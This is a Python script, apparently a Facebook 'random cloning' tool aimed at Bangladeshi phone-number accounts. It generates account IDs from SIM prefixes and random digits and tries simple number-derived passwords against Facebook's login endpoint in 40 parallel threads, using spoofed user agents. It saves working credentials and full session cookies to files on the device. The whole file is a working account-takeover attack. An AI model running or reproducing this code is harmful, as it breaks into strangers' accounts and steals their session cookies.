from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
RED = '\x1b[38;5;46m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
R = '{RED}' 
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
rr = random.randint
for sat in range(1000):
	a='NokiaX'
	b=random.randrange(1,9)
	c='-0'
	d=random.randrange(1,9)
	e='/'
	f=random.randrange(1,9)
	g='.0 ('
	h=random.randrange(1,12)
	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
	j='UNTRUSTED/'
	k=random.randrange(1,3)
	l='.0'
	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
	ugen.append(uaku2)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

  
logo=(f"""     \033[1;97m           ███    ███ ██████  ██   ██ 
                ████  ████ ██   ██  ██ ██  
                ██ ████ ██ ██████    ███   
                ██  ██  ██ ██   ██  ██ ██  
                ██      ██ ██   ██ ██   ██ 
\033[1;32m———————————————————————————————————————————————————————————— 
                  \033[1;97mＭＲＸ ＲＡＢＢＹ ＲＯＵＦ
\033[1;32m————————————————————————————————————————————————————————————
            \033[1;97m▂ ▃ ▅ ▆ ▇ █ 𝐀𝐔𝐓𝐇𝐎𝐑:𝐑𝐀𝐁𝐁𝐈 █ ▇ ▆ ▅ ▃ ▂ 
\033[1;32m————————————————————————————————————————————————————————————
\033[1;32mFACEBOK      : \033[1;32mMRX RABBY ROUF
\033[1;35mGITHUB       : \033[1;35mhttps://github.com/Rabbi1972
\033[1;36mSTATUS       : \033[1;36mRANDOM MIX PASSWORD
\033[1;94mTOOL VIRSION : \033[1;94mPERSONAL
\033[1;32m(✓) RABBI NOT NAME RABBI IS BRAND (✓)
\033[1;32m————————————————————————————————————————————————————————————""")
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r🎮 %sYOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r 🎮 %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;37m01\33[1;92m] START RANDOM CLONING")
#	print("[\033[1;37m02\33[1;92m][\033[1;93mB\33[1;92m] FOLLOW MY FB PAGE")
#	print("[\033[1;37m03\33[1;92m][\033[1;93mC\33[1;92m] FOLLOW MY FB PROFILE")
#	print("[\033[1;37m04\33[1;92m][\033[1;93mD\33[1;92m] JOIN MESSENGER GROUP")
	print('[\033[1;37m00\33[1;92m] EXIT PROGRAMMING')
	print(54*'━')
	opt = input('Choose option >>> ')
	if opt in ["A","1"]:
		virusA()
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100081962435737');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://m.me/j/AbbptWonM1D9UK45/');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
		
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
		Main()
		
def virusA():
	user=[]
	os.system('clear')
	print(logo)
	print("BD SIM CODE 017 015 018 019 013 015 016]")
	kode = input('SELECT : ')
	doamin = 'BD Number id cloner [ONLY-OK] '
	print(' EXAMPLE : 1000,5000,10000,15000,20000] ')
	limit = int(input('LIMIT : '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=40) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('COUNTRY    : Bangladesh')
		print('TOTAL ID   : '+tl)
		print(f'SIM CODE   : \033[1;92m {kode} ')
#		print('START BD MIXED IDS CRACKING ')
		print(50*'━')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode]
			yaari.submit(b,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()

def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write('\r\33[/[%s\33[38;5;46m]\033[38;5;46m-\033[38;5;46m%s'%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'referer': 'https://p.facebook.com/bookmarks/?paipv=0&eav=Afaw00GnGsWs09t22JoyDrxyAo1C8VgMCHO70BbSHdP8D7KqD7yPpP6nEhdxNQH0vZ0',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[65:80]
                print('\033[38;5;46m[RABBI-OK] ' +uid+ '|' +ps+    '  \n\033[1;33mCOOKIES : \033[1;97m'+coki+ ' ')
                cek_apk(session,coki)                
                open('/sdcard/MRX-COOKIE.txt','a').write(uid+'|'+ps+ ' | ' +coki+'\n')
                open('/sdcard/RABBI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\033[38;5;46m[RABBI-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/RABBI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[/[%s\33[38;5;46m]\033[38;5;46m-\033[38;5;46m%s'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
